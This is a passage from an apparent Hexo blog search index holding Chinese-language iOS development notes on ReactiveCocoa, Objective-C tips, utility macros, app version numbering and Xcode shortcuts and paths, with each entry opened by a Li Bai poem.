是RAC里面对线程的简单封装，事件可以在指定的scheduler上分发和执行， 不特殊指定的话，事件的分发和执行都在一个默认的后台线程里面做，大多数情况也就不用动了 有一些特殊的signal必须在主线程调用，使用-deliverOn：可以切换调用的线程。 deliverOn: 更新UI的时候回到主线程执行（子线程加载图片、主线程刷新UI） 1deliverOn:[RACScheduler mainThreadScheduler] chain : multicast : 避免副作用，这两个订阅者接收到了同样的一个请求的内容 1234567891011// Starts a single request, no matter how many subscriptions `connection.signal`// gets. This is equivalent to the -replay operator, or similar to// +startEagerlyWithScheduler:block:.RACMulticastConnection *connection = [networkRequest multicast:[RACReplaySubject subject]];[connection connect];[connection.signal subscribeNext:^(id response) &#123; NSLog(@"subscriber one: %@", response);&#125;];[connection.signal subscribeNext:^(id response) &#123; NSLog(@"subscriber two: %@", response);&#125;]; timeout : 超时，可以让一个信号在一定的时间后，自动报错 interval : 定时，每隔一段时间发出信号 delay : 延迟发送next retry重试 : 只要失败，就会重新执行创建信号中的block,直到成功 replay重放 : 当一个信号被多次订阅,反复播放内容 throttle节流 : 当某个信号发送比较频繁时，可以使用节流，在某一段时间不发送信号内容，过了一段时间获取信号的最新内容发出 延时处理，只有在两次next事件间隔指定的时间时才会发送第二个next事件]]></content>
      <categories>
        <category>iOS</category>
        <category>RAC</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>RAC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发中碎片知识整理]]></title>
    <url>%2Farchives%2Ffd0d6f33.html</url>
    <content type="text"><![CDATA[镜湖三百里，菡萏发荷花。五月西施采，人看隘若耶。回舟不待月，归去越王家。 ——李白《子夜四时歌·夏歌》 琐碎分类与扩展 分类（Category） 只能扩充方法、不能扩充成员变量 不是说不能写property属性，而是写了只会有对应的setter和getter方法的声明，而没有这这两个方法的实现 （UIView扩充的那些只是重写了方法 并不是添加了新的属性变量） 可以用runtime添加属性 匿名分类 （括号里没有名称） 可以扩充方法、也可以扩充成员变量 一篇比较详细深入的参考资料 Automatic Preferred Max Layout Width 警告解决办法 CocoaPods导入格式 第一种写法（没更新到cocoapods最近版本可用） 12platform : ios, '7.0'pod 'AFNetworking' 第二种写法 （更新到最新的版本第一种写法报错） 1234platform :ios, '7.0'target "iOS项目名" dopod 'FMDB'end 如何退出VIM编辑器 i 是进入编辑 进入编辑状态后按 ：esc 再按 shift＋zz，注意是两下z nil、Nil、NULL的区别 nil：指向oc中对象的空指针，针对对象。 Nil：指向oc中类的空指针，针对类。 NULL：指向其他类型的空指针，如一个c类型的内存指针，基本数据类型为空，基本类型。 NSNull：在集合对象中，表示空值的对象。 若obj为nil： ［obj message］将返回NO,而不是NSException 若obj为NSNull: ［obj message］将抛出异常NSException 处理服务器返回的null空数据 用AFN请求网络时可以使用self.removesKeysWithNullValues = YES; 使用分类 NullSafe 直接将NullSafe.m文件拖到项目中，不需要引入任何.h头文件。可以在运行时自动将JSON中的null值替换成nil。 github地址 终极解决办法：MJExtension实现字典转模型。 App跳转方法1[[UIApplication sharedApplication] openURL:[NSURL URLWithString:[NSString stringWithFormat:@"itms-apps://itunes.apple.com/app/id%@", myAppID]]]; 获取Window的区别123AppDelegate* appDelegate = (AppDelegate*)[UIApplication sharedApplication].delegate;UIWindow* window = appDelegate.window;UIWindow* keyw = [UIApplication sharedApplication].keyWindow; 在没有使用UIAlertView时，两者一样，均为我们应用的的Window，其delegate为我们的rootViewController。 在调用了UIAlertView show之后，到UIAlertView消失之前，keyw的值是UIAlertControllerShimPresenterWindow，其delegate是UIAlertShimPresentingViewController。 版本号区别 CFBundleShortVersionString 该标志表示就是应用的版本号，一般是由三个整数分隔组成的字符串。第一个整数代表重大修改的版本，如实现新的功能或重大变化的修订。第二个整数表示的修订，实现较突出的特点。第三个整数代表维护版本。 该键的值不同于“CFBundleVersion”标识 CFBundleShortVersionString对应Xcode里项目的Version CFBundleVersion 标识应用的内部版本号 这个版本是内部自己团队使用的一个版本号，一般不对外公开。 CFBundleVersion 对应Xcode里项目的Build 点击UIButton弹出UIPickerView1234567891011121314151617181920212223// 用来弹出控件 UITextField *pickerViewTextField = [[UITextField alloc] initWithFrame:CGRectZero]; [self.view addSubview:pickerViewTextField]; self.pickerViewTextField = pickerViewTextField; // 设置选择控件 UIPickerView *pickerView = [[UIPickerView alloc] init]; pickerView.delegate = self; pickerView.dataSource = self; pickerView.showsSelectionIndicator = YES; self.pickerView = pickerView; pickerViewTextField.inputView = pickerView;// 工具条 UIToolbar *toolbar = [[UIToolbar alloc] init]; toolbar.height = 44; UIBarButtonItem *item0 = [[UIBarButtonItem alloc] initWithTitle:@"取消" style:UIBarButtonItemStylePlain target:self action:@selector(cancelBtnClick)]; UIBarButtonItem *item1 = [[UIBarButtonItem alloc] initWithBarButtonSystemItem:UIBarButtonSystemItemFlexibleSpace target:nil action:nil]; UIBarButtonItem *item2 = [[UIBarButtonItem alloc] initWithTitle:@"完成" style:UIBarButtonItemStylePlain target:self action:@selector(conformBtnClick)]; toolbar.items = @[item0, item1, item2]; pickerViewTextField.inputAccessoryView = toolbar;// 一定要写 不然弹不出来 [pickerViewTextField becomeFirstResponder]; UITableViewCellUITableViewCell背景颜色 UITableViewCell 设置背景颜色必须是ContentView 自定义XIB可能没有ContentView，也需要自己创建 UITableViewCell选中颜色 iOS6之前可以设置选中颜色为灰色、蓝色、没有颜色；iOS7开始只有默认灰色和没有颜色两种，需要的话可以自定义选中背景设置想要的颜色 UITableViewCellSelectionStyleBlue The cell has a default background color when selected. In iOS 7, the selection color is no longer blue. Use UITableViewCellSelectionStyleDefault instead. 1234UIView *bgColorView = [[UIView alloc] init];bgColorView.backgroundColor = [UIColor blueColor];bgColorView.layer.masksToBounds = YES;cell.selectedBackgroundView = bgColorView; UINavigationController手势问题 UINavigationController 添加手势会默认添加给所有push进来的控制器 可以通过push进来的控制器的数量控制，（topViewController 可以拿到栈顶控制器，在根控制器地方设置的话就是拿到根控制器） 下面的方法也可以过滤不同的手势 gestureRecognizer:可以判断当前触发的手势是哪一个 1234- (BOOL)gestureRecognizerShouldBegin:(UIGestureRecognizer *)gestureRecognizer &#123; XSLog(@"gestureRecognizer : %@", gestureRecognizer); return self.viewControllers.count &gt; 1;&#125; 想隐藏导航控制器的导航栏 方法1 （缺点：滑动返回时候可以看见过度不协调，切换主题如果换导航栏颜色也不协调） 在ViewWillAppear方法设置导航栏隐藏 在ViewWillDisappear方法设置导航栏出现（防止push的其他控制器导航栏也被隐藏） 方法2 （推荐） 需要隐藏导航栏的控制器遵循 UINavigationControllerDelegate 需要隐藏导航栏的控制器设置代理 self.navigationController.delegate = self; 需要隐藏导航栏的控制器 实现代理方法 1234567// 设置导航栏控制器隐藏- (void)navigationController:(UINavigationController *)navigationController willShowViewController:(UIViewController *)viewController animated:(BOOL)animated &#123;// 判断要显示的控制器是否是自己BOOL isLoginVC = [viewController isKindOfClass:[self class]];[self.navigationController setNavigationBarHidden:isLoginVC animated:YES];&#125; 导航栏设置背景颜色为纯色技巧 导航栏默认是不能设置为纯色的，因为系统会自动的加上一个不透明度，所以需要用纯色渲染一张背景图然后设置背景图片就可以了。 设置导航栏背景图片，如果有可以上下滚动的视图可能上下边距就会变化，需要加减相应写导航栏高度的内边距。 AES 加密模式及填充方式 PKCS7Padding ：缺几个字节就补几个字节的0 PKCS5Padding ：缺几个字节就补充几个字节的几，比如缺7个字节，就补充7个字节的7 全局变量的设置方法 使用UserDefualt 实现APP全局变量 在AppDelegate中声明并初始化全局变量、然后在需要使用该变量的地方插入如下的代码： 123//取得AppDelegate，在iOS中，AppDelegat被设计成了单例模式 AppDelegate *appDelegate = [[UIApplication sharedApplication] delegate];appDelegate.Your Variable 使用 extern 关键字 新建Constants.h文件（文件名根据需要自己取），用于存放全局变量 在Constants.h中写入你需要的全局变量名， 例如： NSString *url;//指针类型 int count; //非指针类型 注意：在定义全局变量的时候不能初始化，否则会报错！ 在需要用到全局变量的文件中引入此文件： 1#import "Constants.h" 给全局变量初始化或者赋值： 12345extern NSString *url;url = [[NSString alloc] initWithFormat:@"http://www.google.com"];//指针类型；需要alloc（我试过直接 url = @"www.google.com" 好像也能访问 ）extern int count;count = 0;//非指针类型 3.5 使用全局变量：和使用普通变量一样使用。 性能优化技巧 在循环里面存在大量临时变量，需要手动释放内存，优化导致内存的暴增带来的闪退问题。 12345678for (int i = 0; i&lt;1000000; i++) &#123; @autoreleasepool &#123; NSString *str = @"ABc"; NSString *string = [str lowercaseString]; string = [string stringByAppendingString:@"xyz"]; NSLog(@"%@",string); &#125;&#125; 参考 防止把线下版本打包上传发布AppStore的措施 在Target -&gt; Build Setting 里面搜索Skip Install 将Release环境以外的Skip Install配置成NO，就不会Archive出ipa包 OpenSSL 转证书格式1234// .crt 转 .ceropenssl x509 -in ca.crt -out certificate.cer -outform der// .crt 转 .deropenssl x509 -in ca.crt -out certificate.der -outform der Shadowrocket 状态栏不显示VPN 解决方法 Shadowrocket--Stettings--Config--LOCAL FILES里，点使用的配置文件右边的感叹号，General–最下面有个BYPASS TUN 把里面第一个0.0.0.0/8删掉 制作Mac启动U盘1sudo /Applications/Install\ OS\ X\ El\ Capitan.app/Contents/Resources/createinstallmedia --volume /Volumes/USBName --applicationpath /Applications/Install\ OS\ X\ El\ Capitan.app --nointeraction]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>碎片</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发中常用发的宏定义]]></title>
    <url>%2Farchives%2F9f7da62.html</url>
    <content type="text"><![CDATA[少年上人号怀素，草书天下称独步。墨池飞出北溟鱼，笔锋杀尽中山兔。八月九月天气凉，酒徒词客满高堂。笺麻素绢排数厢，宣州石砚墨色光。吾师醉后倚绳床，须臾扫尽数千张。飘风骤雨惊飒飒，落花飞雪何茫茫。起来向壁不停手，一行数字大如斗。怳怳如闻神鬼惊，时时只见龙蛇走。左盘右蹙如惊电，状同楚汉相攻战。湖南七郡凡几家，家家屏障书题遍。王逸少，张伯英，古来几许浪得名。张颠老死不足数，我师此义不师古。古来万事贵天生，何必要公孙大娘浑脱舞。 ——李白 《草书歌行》 # 常用的宏定义文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// 判断字符串是否为空#define kStringIsEmpty(str) ([str isKindOfClass:[NSNull class]] || str == nil || [str length] &lt; 1 ? YES : NO )// 判断数组是否为空#define kArrayIsEmpty(array) (array == nil || [array isKindOfClass:[NSNull class]] || array.count == 0)// 判断字典是否为空#define kDictIsEmpty(dic) (dic == nil || [dic isKindOfClass:[NSNull class]] || dic.allKeys == 0)// 判断对象是否为空#define kObjectIsEmpty(_object) (_object == nil \ || [_object isKindOfClass:[NSNull class]] \ || ([_object respondsToSelector:@selector(length)] &amp;&amp; [(NSData *)_object length] == 0) \ || ([_object respondsToSelector:@selector(count)] &amp;&amp; [(NSArray *)_object count] == 0))// 一些缩写#define kApplication [UIApplication sharedApplication]#define kKeyWindow [UIApplication sharedApplication].keyWindow#define kAppDelegate [UIApplication sharedApplication].delegate#define kUserDefaults [NSUserDefaults standardUserDefaults]#define kNotificationCenter [NSNotificationCenter defaultCenter]// App版本号及名称#define kAppVersion [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleShortVersionString"]#define kAppDisplayName [[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleDisplayName"]// 区分不同语言导入的头文件#ifdef __OBJC__#import &lt;UIKit/UIKit.h&gt;#import &lt;Foundation/Foundation.h&gt;#import "XSConst.h"#endif// 区分不同环境接口#ifdef DEBUG // 调试状态, 打开LOG功能#define XSLog(...) NSLog(__VA_ARGS__)#define XSKYDWAPIURL @"your_server_debug_url"#define XSKYDWImageAPIURL @"your_server_debug_url"#else // 发布状态, 关闭LOG功能#define XSLog(...)#define XSKYDWAPIURL @"your_server_release_url"#define XSKYDWImageAPIURL @"your_server_release_url"#endif// 打印方法调用#define XSLogFuc XSLog(@"%s", __func__);// 颜色设置#define XSColor(r, g, b) [UIColor colorWithRed:(r)/255.0 green:(g)/255.0 blue:(b)/255.0 alpha:1]// 有透明度的颜色#define XSColorA(r, g, b, a) [UIColor colorWithRed:(r)/255.0 green:(g)/255.0 blue:(b)/255.0 alpha:(a)/255.0]// 灰色#define XSGrayColor(value) XSColor(value, value, value)// 全局灰色#define XSCommonBgColor XSGrayColor(238)// 标签的背景颜色#define XSTagBgColor XSColor(70, 142, 243)// 随机色#define XSRandomColor [UIColor colorWithRed:arc4random_uniform(256)/255.0 green:arc4random_uniform(256)/255.0 blue:arc4random_uniform(256)/255.0 alpha:1.0]// 屏幕的宽高#define kSScreenW [UIScreen mainScreen].bounds.size.width#define kSScreenH [UIScreen mainScreen].bounds.size.height// 判断系统的版本#define iOS7 ([[UIDevice currentDevice].systemVersion doubleValue] &gt;= 7.0)#define iOS8 ([[UIDevice currentDevice].systemVersion doubleValue] &gt;= 8.0)#define iOS9 ([[UIDevice currentDevice].systemVersion doubleValue] &gt;= 9.0)// 为了解析服务器返回的数据 写到pilst文件里面看更清晰#define XSWriteToPlist(obj, filename) [obj writeToFile:[NSString stringWithFormat:@"/Users/user11-kydw/Desktop/%@.plist", filename] atomically:YES];// 消除调用performSelector在ARC下的警告 （系统无法确定返回值类型）#define SuppressPerformSelectorLeakWarning(Stuff) \do &#123; \_Pragma("clang diagnostic push") \_Pragma("clang diagnostic ignored \"-Warc-performSelector-leaks\"") \Stuff; \_Pragma("clang diagnostic pop") \&#125; while (0)]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>App Version</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于App版本号命名规则]]></title>
    <url>%2Farchives%2F4edead15.html</url>
    <content type="text"><![CDATA[两人对酌山花开，一杯一杯复一杯。我醉欲眠卿且去，明朝有意抱琴来。 ——李白 《山中与幽人对酌》 项目中App发布版本统一处理为了统一iOS和安卓两个平台的发布版本不会产生混乱。定义版本号信息为如下格式：主版本号.次版本号.修订版本号 eg : 2.0.0 主版本号：接口做了不支持向下兼容的更改或者界面重构，升级主版本号； 次版本号：做了功能性升级，支持向下兼容，老版本依然正常使用； 修订号：做问题修正，通常修复已知问题（各自维护） 1.0.0 // 第一次发布版本 1.0.1 // 各自的维护的修复bug版本 … 1.1.0 // 正常迭代和新功能添加版本 (统一) … 2.0.0 // 正常迭代和重大改版版本 （需要） …]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>App Version</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发工具Xcode快捷键及相关知识整理]]></title>
    <url>%2Farchives%2Ffd0d6f33.html</url>
    <content type="text"><![CDATA[犬吠水声中，桃花带雨浓。树深时见鹿，溪午不闻钟。野竹分青霭，飞泉挂碧峰。无人知所去，愁倚两三松。 ——李白 《访戴天山道士不遇》 Xcode常用快捷键 Option + shift + K 打出Apple的logo  Command + option + Enter 拖线的时候快速切换到相应的界面 Command + Enter 标准界面 Command + option + 左箭头 折叠代码块 Command + option + 右箭头 打开代码块 Command + option + shift + 左箭头 折叠全部代码块 Command + option + shift + 右箭头 打开全部代码块 Command + option + ，快速分屏 Command + shift + ，打开scheme的界面 Command + shift + O 快速查找文件位置 Command + shift + J 快速定位跳转到查找的文件的位置 Command + control + 上下方向键 快速切记.h .m文件 Command + Option+ 0 显示/隐藏左边实用工具面板 Control + 6 列出当前文件中的方法 Control + 1 切换到Project Navigator Command + Control + Left/right 切换到上次编辑的位置 Control + i 选中代码左对齐 Xcode中用的插件 Alcatraz 一个插件管理平台，下载和移除插件 VVDocumenter 经典的注释插件 FuzzyAutocomplete 代码补全支持模糊查询 KSImageNamed 图片提示插件（Xcode8可以不用了，默认自带 仅限swift） Backlight 当前编辑位置高亮显示 （Xcode8可以不用了，默认自带） Cocoapods 管理三方库的插件、特别实用 ColorSense 颜色提示插件、还可以输入颜色时有一个色板给你选 安装完默认没有效果，需要在Xcode-Edit里面设置显示方式及颜色（我配置的颜色R:127 G: 127 B:121 Opacity:45% Hex Color : #7F7F79） XToDo 快捷键标记，和统一查看 ActivatePowerMode 敲代码时屏幕抖动火花迸溅效果 装逼插件、无聊的时候玩，这个是带声音特效的，（XActivatePowerMode这个效果类似、不带声音特效） Xcode8 注释 Command + / 失效解决办法 终端执行下面代码，然后重启电脑 1~ sudo /usr/libexec/xpccachectl 低版本XCode不支持高版本iOS系统进行真机调试解决方案 这个目录下有当前Xcode所支持的所有真机系统 把最新的Xcode里面的最新的文件拷贝到低版本Xcode里面 1/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport 这个文件有支持的SDK包 把最新的Xcode里面的最新的包拷贝到低版本的Xcode里面 1/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/ 操作的时候尽量退出Xcode，如果完成以上两步还是不能真机调试的话就重启电脑。 常见文件路径 Xcode字体所在路径（提取Xcode8最新字体： San Francisco Mono ）复制到其他版本Xcode中，我得电脑需要切换英语重启电脑才可以选到 1/Applications/Xcode.app/Contents/SharedFrameworks/DVTKit.framework/Versions/A/Resources/Fonts Xcode描述文件路径 1~/Library/MobileDevice/Provisioning Profiles Xcode自带头文件的路径 1/Xcode/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator.sdk/System/Library/Frameworks/UIKit.framework/Headers 修改了系统自带头文件后,Xcode会报错解决方案:删掉下面文件夹的缓存即可(aplle是电脑的用户名) 1/Users/smile/Library/Developer/Xcode/DerivedData 或者 1/Users/smile/Library/Developer/Xcode/DerivedData Xcode的自定义代码块的位置 1/Users/smile/Library/Developer/Xcode/UserData/CodeSnippets Xcode 文档的位置 1/Applications/Xcode.app/Contents/Developer/Documentation/DocSets 插件的位置 1/Users/smile/Library/Application Support/Developer/Shared/Xcode/Plug-ins 沙盒的位置 1/Users/smile/Library/Developer/CoreSimulator/Devices/(文件名称 按时间排序找)/data/Containers/Data/Application 模拟器安装位置 1234// 没有/Profiles/Runtimes 这两个文件夹的话 手动创建/Library/Developer/CoreSimulator/Profiles/Runtimes/Users/smile/Library/Developer/CoreSimulator/Profiles/Runtimes]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>碎片</tag>
      </tags>
  </entry>
</search>
